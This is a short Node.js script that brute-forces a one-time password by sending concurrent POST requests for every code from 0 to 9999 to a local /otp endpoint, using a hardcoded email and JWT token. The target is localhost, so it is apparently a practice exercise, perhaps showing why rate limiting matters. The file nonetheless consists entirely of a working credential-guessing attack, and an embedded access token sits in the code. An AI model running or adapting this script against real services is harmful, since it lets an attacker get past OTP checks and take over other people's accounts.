const axios = require('axios');

async function sendReq(otp) {
  let data = JSON.stringify({
    email: "saket",
    otp: otp
  });

  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/otp',
    headers: { 
      'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4NzdiNWYxMmVjZTAxMmM2ZGMwMWM2NSIsImlhdCI6MTc1MjY3NTgzNH0.uBTjyW8Gql6IaQXfNEEAsMBwJmv1oOEn2ceEpQ6tSdw', 
      'Content-Type': 'application/json'
    },
    data: data
  };

  try {
    const response = await axios.request(config);
    console.log("OTP:", otp, "Response:", response.data);
  } catch (err) {
    console.log("OTP:", otp, "Error:", err.message);
  }
}

async function main() {
  let promises = [];

  for (let i = 0; i < 10000; i++) {  // limit to 1000, adjust as needed
    promises.push(sendReq(i));
    if (promises.length >= 50) {   // batch size (50 concurrent requests)
      await Promise.all(promises);
      promises = [];
    }
  }
}

main();